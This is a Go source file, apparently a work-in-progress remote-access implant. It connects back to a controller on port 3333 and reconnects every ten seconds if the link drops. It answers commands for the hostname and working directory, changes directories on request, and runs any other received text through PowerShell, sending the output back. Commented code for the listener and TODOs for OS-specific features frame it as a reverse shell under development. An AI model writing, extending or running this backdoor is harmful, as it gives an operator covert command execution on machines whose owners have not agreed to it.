package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
)

// const (
// 	CONN_HOST = "192.168.206.97"
// 	CONN_PORT = "3333"
// 	CONN_TYPE = "tcp"
// )

// func main() {
// 	// Listen for incoming connections.
// 	l, err := net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
// 	if err != nil {
// 		fmt.Println("Error listening:", err.Error())
// 		os.Exit(1)
// 	}
// 	// Close the listener when the application closes.
// 	defer l.Close()
// 	fmt.Println("Listening on " + CONN_HOST + ":" + CONN_PORT)
// 	for {
// 		// Listen for an incoming connection.
// 		conn, err := l.Accept()
// 		if err != nil {
// 			fmt.Println("Error accepting: ", err.Error())
// 			os.Exit(1)
// 		}
// 		// Handle connections in a new goroutine.
// 		go handleRequest(conn)
// 	}
// }
// TODO this should be called "server" because things are connecting to it!

// func whatOS() add method to determin what OS is running on the connected machine

// add windows specific functions

// add linux specific functions
// - utilizing things like pwd, "..", and absolute/relative paths
//   to make our lives easier when we use "cd ..", or "cd [relative file path]"

// add a print formatter if there is not one already made online

// Handles incoming requests.
func main() {
	servAddr := "localhost:3333"
	for {
		connected := false
		var conn net.Conn = nil
		for !connected {
			connected = true
			tcpAddr, err := net.ResolveTCPAddr("tcp", servAddr)
			if err != nil {
				println("ResolveTCPAddr failed:", err.Error())
				// os.Exit(1)
			}

			conn, err = net.DialTCP("tcp", nil, tcpAddr)
			if err != nil {
				println("Dial failed:", err.Error())
				time.Sleep(10 * time.Second)
				connected = false
				// os.Exit(1)
			}
		}

		for {
			// Make a buffer to hold incoming data.
			buf := make([]byte, 8192)
			// Read the incoming connection into the buffer.
			_, err := conn.Read(buf)
			if err != nil {
				fmt.Println("Error reading:", err.Error())
				break
			}
			bufString := ""
			for _, v := range buf {
				if v != 0 {
					bufString = bufString + string(v)
				}
			}
			if bufString == "gimme" {
				name, err := os.Hostname()
				if err != nil {
					fmt.Printf("Oops: %v\n", err)
				}
				conn.Write([]byte(name))
			} else if bufString == "whereami" {
				directory, err := os.Getwd()
				if err != nil {
					fmt.Printf("Oops: %v\n", err)
				}
				conn.Write([]byte(directory))
			} else if buf[0] == 'c' && buf[1] == 'd' {
				splits := strings.Split(bufString, " ")
				if len(splits) <= 1 {
					conn.Write([]byte("cd no worky"))
					break
				}
				// fmt.Println(splits[1])
				dir := strings.TrimSpace(splits[1])
				err := os.Chdir(dir)
				if err != nil {
					fmt.Println("Error changing directory", err.Error())
					conn.Write([]byte("Error changing directory " + err.Error()))
				}
				wd, _ := os.Getwd()
				conn.Write([]byte("directory changed to " + wd))
			} else {
				cmd := exec.Command("powershell", bufString)
				output, err := cmd.CombinedOutput()
				if err != nil {
					fmt.Println(fmt.Sprint(err) + ": " + string(output))
					conn.Write([]byte("error"))
					return
				}
				fmt.Println(string(output))
				conn.Write(output)
			}
		}
	}
	// Close the connection when you're done with it.
	// conn.Close()
}
